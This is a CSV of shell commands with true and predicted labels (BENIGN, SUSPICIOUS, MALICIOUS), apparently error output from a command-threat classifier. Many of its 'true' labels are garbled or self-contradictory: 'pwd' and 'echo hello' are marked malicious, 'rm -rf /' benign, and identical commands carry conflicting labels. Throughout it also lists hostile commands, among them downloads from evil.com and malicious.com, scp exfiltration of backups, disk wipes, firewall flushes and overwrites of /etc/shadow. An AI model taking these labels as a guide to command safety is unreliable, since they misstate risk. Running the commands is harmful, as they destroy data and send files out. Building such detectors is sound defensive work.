command,true_label,predicted_label
echo 'hello',SUSPICIOUS,BENIGN
cat .bashrc,SUSPICIOUS,BENIGN
chmod 777 /root/.bashrc,MALICIOUS,BENIGN
cd /var/www,SUSPICIOUS,BENIGN
cat ~/.ssh/known_hosts,SUSPICIOUS,BENIGN
ls /tmp/,SUSPICIOUS,BENIGN
curl -O http://malicious.com/malware.bin,MALICIOUS,BENIGN
chmod 777 /root/.bashrc,MALICIOUS,SUSPICIOUS
sudo apt install htop,SUSPICIOUS,BENIGN
top -n 1,SUSPICIOUS,BENIGN
echo 'hello',SUSPICIOUS,BENIGN
pwd,SUSPICIOUS,MALICIOUS
cd   /root/,SUSPICIOUS,BENIGN
SUDO SU,SUSPICIOUS,BENIGN
cat readme.md,SUSPICIOUS,BENIGN
echo 'hacked' > /root/.bashrc,MALICIOUS,BENIGN
ECHO 'OWNED' > /ROOT/.BASHRC,BENIGN,SUSPICIOUS
ls /tmp/,BENIGN,SUSPICIOUS
curl https://safe-site.org/update.sh,SUSPICIOUS,BENIGN
scp file.txt root@malicious.com:/tmp/,SUSPICIOUS,BENIGN
cat homework.txt ,MALICIOUS,BENIGN
cat /root/.bashrc,MALICIOUS,BENIGN
chmod 777 /etc/shadow,SUSPICIOUS,BENIGN
wget http://malicious.com/payload.sh,SUSPICIOUS,MALICIOUS
echo 'hello world' ,MALICIOUS,BENIGN
cat /var/log/syslog,SUSPICIOUS,BENIGN
scp data.tar.gz root@192.168.0.2:/tmp/,BENIGN,MALICIOUS
echo   'owned' >> /root/.bashrc,MALICIOUS,BENIGN
mkdir test,MALICIOUS,BENIGN
cat /var/log/syslog,MALICIOUS,SUSPICIOUS
cat   /etc/shadow,SUSPICIOUS,BENIGN
cat   /home/user/todo.txt,BENIGN,SUSPICIOUS
sudo   su,MALICIOUS,BENIGN
echo 'pwned' >> /root/.bashrc,MALICIOUS,BENIGN
echo 'pwned' > /etc/shadow,MALICIOUS,BENIGN
ls -al,SUSPICIOUS,BENIGN
cd /var/www,BENIGN,MALICIOUS
ssh -L 8080:target.com:80 attacker@remote,SUSPICIOUS,BENIGN
sudo su,MALICIOUS,BENIGN
cat   /home/user/info.txt,SUSPICIOUS,BENIGN
ps aux | grep nginx ,BENIGN,SUSPICIOUS
echo 'hello',SUSPICIOUS,MALICIOUS
chmod 777 /etc/shadow,MALICIOUS,SUSPICIOUS
cat /etc/passwd,BENIGN,SUSPICIOUS
ps aux,SUSPICIOUS,BENIGN
curl https://suspicious.org/update.bin,SUSPICIOUS,BENIGN
netstat -tulnp,SUSPICIOUS,BENIGN
echo 'malware' > /tmp/malware.sh,MALICIOUS,BENIGN
scp file.txt root@192.168.0.2:/var/www,SUSPICIOUS,BENIGN
ls /root/,MALICIOUS,SUSPICIOUS
touch homework.doc,SUSPICIOUS,BENIGN
wget http://malicious.com/payload.sh,SUSPICIOUS,BENIGN
curl https://suspicious.org/payload.sh ,SUSPICIOUS,BENIGN
CAT /ROOT/.BASHRC,MALICIOUS,BENIGN
env,MALICIOUS,BENIGN
echo 'owned' >> /var/log/syslog,SUSPICIOUS,BENIGN
dd if=/dev/zero of=/dev/sda,SUSPICIOUS,BENIGN
echo 'owned' >> /var/log/syslog,MALICIOUS,BENIGN
pwd,MALICIOUS,BENIGN
grep root /etc/passwd,MALICIOUS,SUSPICIOUS
cat readme.md,SUSPICIOUS,BENIGN
scp backup.sql root@malicious.com:/var/www,MALICIOUS,BENIGN
mv /bin/bash /tmp/bash,BENIGN,MALICIOUS
curl https://fileshare.com/exploit.zip,BENIGN,MALICIOUS
dd if=/dev/zero of=/dev/sda,MALICIOUS,BENIGN
uname -a,MALICIOUS,BENIGN
cd /var/www,MALICIOUS,BENIGN
echo 'hacked' > /root/.bashrc,SUSPICIOUS,BENIGN
find / -name 'test',BENIGN,MALICIOUS
HISTORY,SUSPICIOUS,BENIGN
cat   /etc/passwd,SUSPICIOUS,BENIGN
echo 'hacked' > /root/.bashrc,SUSPICIOUS,BENIGN
 CAT /ROOT/.BASHRC,SUSPICIOUS,BENIGN
uname -a,MALICIOUS,SUSPICIOUS
RM -RF /,MALICIOUS,BENIGN
dd if=/dev/zero of=/dev/sda,MALICIOUS,BENIGN
ls /root/,SUSPICIOUS,BENIGN
netstat -tulnp,BENIGN,MALICIOUS
wget http://fileshare.com/update.bin,SUSPICIOUS,BENIGN
grep   root /etc/passwd,MALICIOUS,SUSPICIOUS
wget http://evil.com/update.bin,MALICIOUS,BENIGN
scp   file.txt user@malicious.com:/var/www,SUSPICIOUS,BENIGN
SSH -L 8080:TARGET.COM:80 ATTACKER@REMOTE,SUSPICIOUS,BENIGN
ps aux | grep sshd,MALICIOUS,BENIGN
rm -rf /,SUSPICIOUS,BENIGN
echo 'hello   world',MALICIOUS,SUSPICIOUS
curl   -O http://malicious.com/malware.bin,MALICIOUS,BENIGN
curl -O http://evil.com/payload.sh,MALICIOUS,BENIGN
cd /root,BENIGN,SUSPICIOUS
cat   welcome.txt,MALICIOUS,SUSPICIOUS
chmod 777 /root/.bashrc,SUSPICIOUS,BENIGN
curl   -o http://evil.com/payload.sh,SUSPICIOUS,BENIGN
df -h,MALICIOUS,SUSPICIOUS
history,SUSPICIOUS,BENIGN
curl https://evil.com/exploit.zip,MALICIOUS,BENIGN
cat   /home/user/todo.txt,MALICIOUS,BENIGN
dd if=/dev/zero of=/dev/sda,SUSPICIOUS,BENIGN
curl -O http://fileshare.com/payload.sh,BENIGN,MALICIOUS
CURL HTTP://UNKNOWN.SITE/SCRIPT.SH,SUSPICIOUS,BENIGN
cat   readme.md,SUSPICIOUS,BENIGN
curl https://safe-site.org/update.sh,BENIGN,MALICIOUS
pwd,MALICIOUS,SUSPICIOUS
cat homework.txt ,MALICIOUS,BENIGN
UNAME -A,SUSPICIOUS,BENIGN
curl https://suspicious.org/payload.sh,MALICIOUS,BENIGN
sudo apt update,MALICIOUS,BENIGN
ls /root/,MALICIOUS,BENIGN
cat welcome.txt ,SUSPICIOUS,BENIGN
cat /etc/shadow,MALICIOUS,SUSPICIOUS
ls -al,MALICIOUS,BENIGN
curl   https://suspicious.org/update.bin,SUSPICIOUS,BENIGN
SUDO APT INSTALL HTOP ,MALICIOUS,BENIGN
ls   /root/,SUSPICIOUS,BENIGN
history,MALICIOUS,BENIGN
which python,SUSPICIOUS,BENIGN
cat welcome.txt,MALICIOUS,SUSPICIOUS
sudo su,MALICIOUS,BENIGN
top -n   1,SUSPICIOUS,BENIGN
ls   -al,MALICIOUS,SUSPICIOUS
sudo apt update,MALICIOUS,BENIGN
chmod 777   /etc/shadow,MALICIOUS,BENIGN
cat homework.txt,SUSPICIOUS,BENIGN
cat /home/user/info.txt,SUSPICIOUS,BENIGN
wget http://malicious.com/payload.sh,MALICIOUS,BENIGN
echo 'hacked' >> /var/log/syslog,SUSPICIOUS,BENIGN
ps aux,BENIGN,MALICIOUS
dd if=/dev/zero of=/dev/sda,SUSPICIOUS,BENIGN
uname -a,SUSPICIOUS,MALICIOUS
curl http://unknown.site/script.sh,SUSPICIOUS,BENIGN
netstat -tulnp,BENIGN,SUSPICIOUS
curl http://unknown.site/script.sh,MALICIOUS,BENIGN
curl -o http://suspicious.org/exploit.zip,MALICIOUS,BENIGN
df -h,MALICIOUS,SUSPICIOUS
ECHO 'PWNED' > /ROOT/.BASHRC,MALICIOUS,BENIGN
ls /tmp/,BENIGN,MALICIOUS
SUDO -L,SUSPICIOUS,BENIGN
echo 'hello world',MALICIOUS,BENIGN
ssh -L 8080:target.com:80 attacker@remote,SUSPICIOUS,BENIGN
ps aux | grep nginx,BENIGN,MALICIOUS
 sudo apt install net-tools,SUSPICIOUS,BENIGN
PWD,SUSPICIOUS,BENIGN
iptables -F,MALICIOUS,BENIGN
CAT /VAR/LOG/SYSLOG,SUSPICIOUS,BENIGN
chmod 777 /root/.bashrc,SUSPICIOUS,MALICIOUS
ping google.com,SUSPICIOUS,BENIGN
iptables -F,SUSPICIOUS,BENIGN
mkdir   test,BENIGN,SUSPICIOUS
chmod 777 /etc/shadow,BENIGN,SUSPICIOUS
sudo apt update,MALICIOUS,BENIGN
ls /root/,MALICIOUS,BENIGN
uname -a,SUSPICIOUS,BENIGN
du -sh,SUSPICIOUS,BENIGN
echo 'hello',SUSPICIOUS,MALICIOUS
mv /bin/bash /tmp/bash,MALICIOUS,BENIGN
wget http://suspicious.org/exploit.zip,SUSPICIOUS,BENIGN
cat /var/log/auth.log,SUSPICIOUS,BENIGN
 grep 'password' /etc/passwd,MALICIOUS,BENIGN
df -h,MALICIOUS,BENIGN
curl https://safe-site.org/update.sh,MALICIOUS,BENIGN
curl -O http://fileshare.com/payload.sh,BENIGN,MALICIOUS
curl https://fileshare.com/update.bin,MALICIOUS,BENIGN
echo 'hacked' >> /root/.bashrc,SUSPICIOUS,BENIGN
ls /tmp/,SUSPICIOUS,BENIGN
cat notes.txt,SUSPICIOUS,BENIGN
ECHO   'MALWARE' > /TMP/MALWARE.SH,MALICIOUS,BENIGN
chmod 777 /var/log/syslog,SUSPICIOUS,BENIGN
echo 'pwned' > /etc/shadow,SUSPICIOUS,BENIGN
cat /var/log/syslog,BENIGN,SUSPICIOUS
cat /var/log/syslog,MALICIOUS,SUSPICIOUS
cat /home/user/info.txt,SUSPICIOUS,BENIGN
ls /root/,MALICIOUS,BENIGN
cat /var/log/syslog,SUSPICIOUS,BENIGN
echo 'hacked' > /etc/shadow,BENIGN,MALICIOUS
cat   welcome.txt,MALICIOUS,BENIGN
find / -name 'test',SUSPICIOUS,BENIGN
ping google.com,MALICIOUS,BENIGN
chmod 777 /etc/shadow,MALICIOUS,BENIGN
CHMOD   777 /ETC/SHADOW,SUSPICIOUS,BENIGN
CURL   HTTPS://EVIL.COM/UPDATE.BIN,MALICIOUS,BENIGN
CAT /VAR/LOG/SYSLOG ,SUSPICIOUS,BENIGN
 cat /var/log/auth.log,SUSPICIOUS,BENIGN
mkdir test,MALICIOUS,BENIGN
mv /bin/bash /tmp/bash,MALICIOUS,BENIGN
cd /root,SUSPICIOUS,BENIGN
scp backup.sql user@192.168.0.2:/root/,BENIGN,SUSPICIOUS
chmod 777 /root/.bashrc,SUSPICIOUS,BENIGN
wget http://evil.com/payload.sh,SUSPICIOUS,BENIGN
wget   http://fileshare.com/payload.sh,BENIGN,MALICIOUS
chmod 777 /etc/shadow,MALICIOUS,BENIGN
grep 'password' /etc/passwd,BENIGN,SUSPICIOUS
 cat /home/user/todo.txt,SUSPICIOUS,BENIGN
cat   notes.txt,SUSPICIOUS,MALICIOUS
cat .bashrc,SUSPICIOUS,BENIGN
cat /root/.bashrc,MALICIOUS,BENIGN
ps aux,MALICIOUS,BENIGN
df -h,MALICIOUS,SUSPICIOUS
ls /root/,SUSPICIOUS,BENIGN
iptables -F,MALICIOUS,SUSPICIOUS
watch netstat -an,SUSPICIOUS,BENIGN
curl https://fileshare.com/exploit.zip,SUSPICIOUS,BENIGN
 cd /root,MALICIOUS,BENIGN
grep 'password' /etc/passwd,BENIGN,MALICIOUS
curl http://unknown.site/script.sh,MALICIOUS,BENIGN
cat /root/.bashrc,MALICIOUS,BENIGN
sudo apt update,MALICIOUS,BENIGN
 ps aux,SUSPICIOUS,MALICIOUS
top -n 1,SUSPICIOUS,BENIGN
watch netstat -an,MALICIOUS,BENIGN
watch netstat -an,MALICIOUS,BENIGN
wget http://malicious.com/payload.sh,MALICIOUS,BENIGN
cat /home/user/todo.txt,SUSPICIOUS,BENIGN
curl https://suspicious.org/payload.sh,MALICIOUS,SUSPICIOUS
which python,MALICIOUS,BENIGN
grep root /etc/passwd ,MALICIOUS,BENIGN
mv /bin/bash /tmp/bash,SUSPICIOUS,BENIGN
echo 'hello',SUSPICIOUS,MALICIOUS
echo 'hello',MALICIOUS,BENIGN
cat /root/.bashrc,SUSPICIOUS,BENIGN
cd /tmp/,BENIGN,SUSPICIOUS
ps aux | grep sshd,BENIGN,SUSPICIOUS
curl https://safe-site.org/update.sh,MALICIOUS,BENIGN
echo 'owned' > /var/log/syslog,SUSPICIOUS,BENIGN
echo 'hacked' > /var/log/syslog,SUSPICIOUS,BENIGN
dd if=/dev/zero of=/dev/sda,MALICIOUS,BENIGN
scp file.txt attacker@remote:/tmp/ ,MALICIOUS,BENIGN
echo 'malware' > /tmp/malware.sh,SUSPICIOUS,BENIGN
cat readme.md,MALICIOUS,BENIGN
ifconfig,SUSPICIOUS,BENIGN
netstat -tulnp,SUSPICIOUS,BENIGN
cat   notes.txt,BENIGN,MALICIOUS
curl -O http://fileshare.com/exploit.zip,SUSPICIOUS,BENIGN
chmod 777 /etc/shadow,MALICIOUS,BENIGN
curl https://safe-site.org/update.sh,MALICIOUS,BENIGN
cat /home/user/todo.txt,SUSPICIOUS,BENIGN
curl -O http://suspicious.org/exploit.zip,MALICIOUS,BENIGN
echo 'hello',MALICIOUS,BENIGN
grep 'password' /etc/passwd,SUSPICIOUS,BENIGN
ping google.com,MALICIOUS,SUSPICIOUS
wget http://suspicious.org/payload.sh,SUSPICIOUS,BENIGN
ls -al,MALICIOUS,BENIGN
cat /root/.bashrc,SUSPICIOUS,BENIGN
cat welcome.txt,SUSPICIOUS,BENIGN
ls -al,SUSPICIOUS,BENIGN
watch netstat -an,MALICIOUS,BENIGN
 mkdir test,SUSPICIOUS,BENIGN
cat /home/user/todo.txt,SUSPICIOUS,BENIGN
curl http://unknown.site/script.sh ,SUSPICIOUS,BENIGN
cat .bashrc,SUSPICIOUS,BENIGN
ls /var/www,SUSPICIOUS,BENIGN
curl https://evil.com/payload.sh,MALICIOUS,BENIGN
cat /etc/passwd ,SUSPICIOUS,BENIGN
cd /root/,MALICIOUS,BENIGN
mv /bin/bash /tmp/bash,MALICIOUS,BENIGN
touch homework.doc,MALICIOUS,BENIGN
 mv /bin/bash /tmp/bash,SUSPICIOUS,BENIGN
sudo apt install net-tools ,BENIGN,SUSPICIOUS
RM -RF /HOME/USER,MALICIOUS,BENIGN
chmod 777 /etc/shadow,SUSPICIOUS,BENIGN
cat notes.txt,MALICIOUS,BENIGN
scp file.txt attacker@remote:/tmp/,SUSPICIOUS,BENIGN
cd /root/,BENIGN,SUSPICIOUS
rm -rf /home/user,MALICIOUS,SUSPICIOUS
 curl -o http://fileshare.com/exploit.zip,BENIGN,MALICIOUS
ps aux | grep mysql,SUSPICIOUS,BENIGN
ps aux | grep mysql,MALICIOUS,BENIGN
echo 'hello world',BENIGN,MALICIOUS
history,SUSPICIOUS,BENIGN
CAT README.MD,SUSPICIOUS,BENIGN
history,SUSPICIOUS,BENIGN
rm -rf /var/,SUSPICIOUS,BENIGN
cat /etc/passwd,MALICIOUS,BENIGN
cat /home/user/todo.txt,MALICIOUS,BENIGN
 cat readme.md,BENIGN,MALICIOUS
du -sh,MALICIOUS,BENIGN
curl https://fileshare.com/exploit.zip,SUSPICIOUS,BENIGN
wget http://evil.com/exploit.zip,MALICIOUS,BENIGN
curl http://unknown.site/script.sh,SUSPICIOUS,MALICIOUS
echo 'hacked' >> /var/log/syslog,BENIGN,SUSPICIOUS
rm -rf /* --no-preserve-root,MALICIOUS,BENIGN
sudo apt install htop,BENIGN,MALICIOUS
cat /root/.bashrc,SUSPICIOUS,BENIGN
rm -rf / ,BENIGN,SUSPICIOUS
grep 'password' /etc/passwd,BENIGN,MALICIOUS
echo 'hacked' > /root/.bashrc,SUSPICIOUS,BENIGN
scp backup.sql admin@malicious.com:/var/www,BENIGN,SUSPICIOUS
ps aux | grep nginx,MALICIOUS,BENIGN
which python,MALICIOUS,BENIGN
cat /root/.bashrc,MALICIOUS,BENIGN
sudo apt update,MALICIOUS,BENIGN
cat /var/log/syslog ,SUSPICIOUS,BENIGN
pwd,MALICIOUS,BENIGN
echo 'hello',SUSPICIOUS,BENIGN
grep 'password' /etc/passwd,MALICIOUS,BENIGN
cat notes.txt,SUSPICIOUS,BENIGN
echo 'owned' > /var/log/syslog,BENIGN,MALICIOUS
scp data.tar.gz admin@malicious.com:/var/www,MALICIOUS,BENIGN
cat /etc/shadow,BENIGN,SUSPICIOUS
ping google.com,BENIGN,SUSPICIOUS
curl -O http://malicious.com/malware.bin ,SUSPICIOUS,BENIGN
sudo apt install nmap,MALICIOUS,BENIGN
ping google.com,SUSPICIOUS,BENIGN
echo 'hello',MALICIOUS,SUSPICIOUS
dd if=/dev/zero of=/dev/sda,SUSPICIOUS,BENIGN
rm -rf /,MALICIOUS,BENIGN
cat /home/user/todo.txt,SUSPICIOUS,BENIGN
mv /bin/bash /tmp/bash,SUSPICIOUS,MALICIOUS
ssh -L 8080:target.com:80 attacker@remote,SUSPICIOUS,BENIGN
ls /tmp/,MALICIOUS,BENIGN
curl -O http://fileshare.com/payload.sh,BENIGN,MALICIOUS
env,MALICIOUS,BENIGN
cat /etc/passwd,MALICIOUS,BENIGN
cd /root,SUSPICIOUS,BENIGN
chmod   777 /etc/shadow,SUSPICIOUS,BENIGN
curl -O   http://malicious.com/malware.bin,SUSPICIOUS,BENIGN
curl -O http://fileshare.com/payload.sh,SUSPICIOUS,BENIGN
cat welcome.txt,SUSPICIOUS,BENIGN
cd /var/www,MALICIOUS,BENIGN
curl https://safe-site.org/update.sh,MALICIOUS,BENIGN
env,MALICIOUS,BENIGN
env ,MALICIOUS,BENIGN
rm -rf /var/,MALICIOUS,BENIGN
ls -al,MALICIOUS,SUSPICIOUS
echo   'malware' > /tmp/malware.sh,MALICIOUS,BENIGN
curl https://evil.com/update.bin,BENIGN,MALICIOUS
watch netstat -an,SUSPICIOUS,BENIGN
cat homework.txt,SUSPICIOUS,BENIGN
cd /root,BENIGN,MALICIOUS
curl -o   http://evil.com/payload.sh,SUSPICIOUS,MALICIOUS
dd if=/dev/zero of=/dev/sda,MALICIOUS,SUSPICIOUS
curl -o http://suspicious.org/exploit.zip,SUSPICIOUS,MALICIOUS
ls -al,MALICIOUS,BENIGN
RM -RF /VAR/,SUSPICIOUS,BENIGN
chmod 777 /etc/shadow,BENIGN,MALICIOUS
cat readme.md,SUSPICIOUS,MALICIOUS
ssh -L 8080:target.com:80 attacker@remote,MALICIOUS,SUSPICIOUS
echo 'pwned' >> /root/.bashrc,SUSPICIOUS,BENIGN
cat /etc/passwd,BENIGN,MALICIOUS
echo 'hacked' > /root/.bashrc,SUSPICIOUS,BENIGN
iptables -F,MALICIOUS,BENIGN
IPTABLES -F,SUSPICIOUS,BENIGN
whoami,MALICIOUS,BENIGN
rm -rf /var/,MALICIOUS,BENIGN
cd /root,MALICIOUS,BENIGN
env,BENIGN,SUSPICIOUS
chmod   777 /etc/shadow,SUSPICIOUS,BENIGN
cat /home/user/todo.txt,MALICIOUS,BENIGN
sudo apt install net-tools,MALICIOUS,BENIGN
wget http://fileshare.com/payload.sh,SUSPICIOUS,BENIGN
which python,SUSPICIOUS,BENIGN
top -n 1,SUSPICIOUS,BENIGN
pwd,MALICIOUS,SUSPICIOUS
cat   /home/user/todo.txt,SUSPICIOUS,BENIGN
DU   -SH,MALICIOUS,BENIGN
cat /home/user/info.txt,SUSPICIOUS,BENIGN
mv /bin/bash /tmp/bash,SUSPICIOUS,BENIGN
echo 'hello',SUSPICIOUS,BENIGN
watch netstat -an,BENIGN,SUSPICIOUS
RM -RF /* --NO-PRESERVE-ROOT ,SUSPICIOUS,MALICIOUS
cd /root,MALICIOUS,BENIGN
cat /var/log/syslog,SUSPICIOUS,BENIGN
ls -al,MALICIOUS,BENIGN
sudo apt update,SUSPICIOUS,BENIGN
env,SUSPICIOUS,BENIGN
curl -O http://evil.com/payload.sh,SUSPICIOUS,BENIGN
echo 'hacked' > /root/.bashrc,MALICIOUS,SUSPICIOUS
touch homework.doc,SUSPICIOUS,BENIGN
WHOAMI,MALICIOUS,BENIGN
mv /bin/bash /tmp/bash,SUSPICIOUS,BENIGN
dd if=/dev/zero of=/dev/sda ,SUSPICIOUS,BENIGN
df -h,MALICIOUS,BENIGN
sudo   -l,BENIGN,SUSPICIOUS
 history,SUSPICIOUS,BENIGN
echo 'hacked' > /root/.bashrc,SUSPICIOUS,BENIGN
 curl https://suspicious.org/exploit.zip,MALICIOUS,BENIGN
chmod 777 /etc/shadow,SUSPICIOUS,BENIGN
touch   homework.doc,SUSPICIOUS,BENIGN
ping   google.com,SUSPICIOUS,BENIGN
ps aux | grep mysql,SUSPICIOUS,BENIGN
rm -rf /,MALICIOUS,BENIGN
cat welcome.txt,SUSPICIOUS,BENIGN
ping google.com,MALICIOUS,BENIGN
du   -sh,SUSPICIOUS,BENIGN
CAT   /HOME/USER/TODO.TXT,SUSPICIOUS,BENIGN
cat /root/.bashrc,MALICIOUS,BENIGN
cat /root/.bashrc,BENIGN,SUSPICIOUS
cat /var/log/syslog,MALICIOUS,BENIGN
ps aux | grep nginx,SUSPICIOUS,BENIGN
cat .bashrc,SUSPICIOUS,BENIGN
mkdir test,MALICIOUS,BENIGN
chmod 777 /etc/shadow,SUSPICIOUS,BENIGN
whoami,SUSPICIOUS,BENIGN
echo 'malware' > /tmp/malware.sh,MALICIOUS,BENIGN
ps aux | grep nginx,MALICIOUS,BENIGN
which python,MALICIOUS,BENIGN
cat   readme.md,SUSPICIOUS,BENIGN
sudo su,SUSPICIOUS,BENIGN
ls /var/www,SUSPICIOUS,BENIGN
cat welcome.txt,SUSPICIOUS,BENIGN
df -h ,SUSPICIOUS,BENIGN
LS /ROOT/,BENIGN,MALICIOUS
wget http://malicious.com/payload.sh,SUSPICIOUS,BENIGN
cat /home/user/todo.txt,SUSPICIOUS,BENIGN
curl https://evil.com/exploit.zip,SUSPICIOUS,BENIGN
sudo apt install nmap,SUSPICIOUS,BENIGN
cd /var/www,SUSPICIOUS,BENIGN
chmod 777 /var/log/syslog,SUSPICIOUS,MALICIOUS
cat /var/log/auth.log,MALICIOUS,BENIGN
ping google.com,MALICIOUS,BENIGN
curl -O http://evil.com/payload.sh,BENIGN,SUSPICIOUS
 ifconfig,MALICIOUS,SUSPICIOUS
wget   http://fileshare.com/exploit.zip,SUSPICIOUS,BENIGN
echo 'hello world',MALICIOUS,SUSPICIOUS
sudo apt update,BENIGN,SUSPICIOUS
touch   homework.doc,BENIGN,MALICIOUS
ECHO   'OWNED' >> /VAR/LOG/SYSLOG,MALICIOUS,BENIGN
curl http://unknown.site/script.sh,MALICIOUS,BENIGN
echo 'pwned' >> /var/log/syslog,MALICIOUS,BENIGN
curl -O http://fileshare.com/payload.sh,MALICIOUS,BENIGN
cat .bashrc,SUSPICIOUS,BENIGN
iptables -F,SUSPICIOUS,BENIGN
chmod 777   /var/log/syslog,SUSPICIOUS,BENIGN
echo 'hacked' >>   /var/log/syslog,SUSPICIOUS,BENIGN
cat readme.md,MALICIOUS,SUSPICIOUS
CHMOD 777 /VAR/LOG/SYSLOG,MALICIOUS,BENIGN
du   -sh,SUSPICIOUS,BENIGN
cat homework.txt,MALICIOUS,BENIGN
iptables -F,MALICIOUS,BENIGN
env,BENIGN,MALICIOUS
cat /home/user/todo.txt,SUSPICIOUS,BENIGN
echo 'hacked' > /root/.bashrc,SUSPICIOUS,BENIGN
cat   /var/log/auth.log,SUSPICIOUS,BENIGN
cat /root/.bashrc,SUSPICIOUS,BENIGN
chmod 777 /etc/shadow,MALICIOUS,BENIGN
touch   homework.doc,SUSPICIOUS,MALICIOUS
echo   'hacked' > /root/.bashrc,MALICIOUS,BENIGN
cd /var/www,SUSPICIOUS,BENIGN
watch netstat -an,SUSPICIOUS,BENIGN
uname -a,SUSPICIOUS,BENIGN
cat   /var/log/syslog,BENIGN,MALICIOUS
curl -O http://suspicious.org/payload.sh,SUSPICIOUS,BENIGN
echo 'pwned' > /var/log/syslog,MALICIOUS,BENIGN
cat ~/.ssh/known_hosts,SUSPICIOUS,BENIGN
sudo -l,BENIGN,SUSPICIOUS
cat /etc/passwd,MALICIOUS,SUSPICIOUS
